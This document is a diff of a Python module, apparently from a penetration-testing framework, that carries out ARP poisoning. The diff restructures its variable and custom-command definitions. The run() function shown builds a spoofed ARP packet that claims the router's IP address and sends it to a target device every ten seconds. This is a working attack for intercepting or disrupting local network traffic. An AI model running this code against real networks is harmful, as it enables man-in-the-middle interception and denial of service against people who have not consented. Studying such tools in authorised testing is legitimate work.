@@ -23,28 +23,17 @@ conf = {
 
 # List of variables
 variables = OrderedDict((
-	('target', '192.168.1.2'),
-	('router', '192.168.1.1'),
-))
-
-# Description for variables
-vdesc = [
-	"target device's ip",
-	"router's ip",
-]
-
-# Help for the custom commands (remove if you will not use custom commands)
-mhelp = OrderedDict((
-	('scan', 'scan for targets'),
+	('target', ['192.168.1.2', "target device's ip"]),
+	('router', ['192.168.1.1', "router's ip"]),
 ))
 
 # Additional help notes
 help_notes = colors.red+"this module will not work without root permission!\n this will not work alway because some devices can refuse from arp request!"+colors.end
 
 #custom commands
-customcommands = (
-	'scan',
-)
+customcommands = {
+	'scan': 'scan for targets'
+}
 
 #simple changelog
 changelog = "Version 1.0:\nrelease"
@@ -53,8 +42,8 @@ def run():
 	print(colors.blue + "[*] arp poisoning has been started!" + colors.end)
 	print(colors.blue + "[*] ctrl + c to end" + colors.end)
 	packet = ARP()
-	packet.psrc = variables['router']
-	packet.pdst = variables['target']
+	packet.psrc = variables['router'][0]
+	packet.pdst = variables['target'][0]
 	while 1:
 		send(packet, verbose=False)
 		sleep(10)
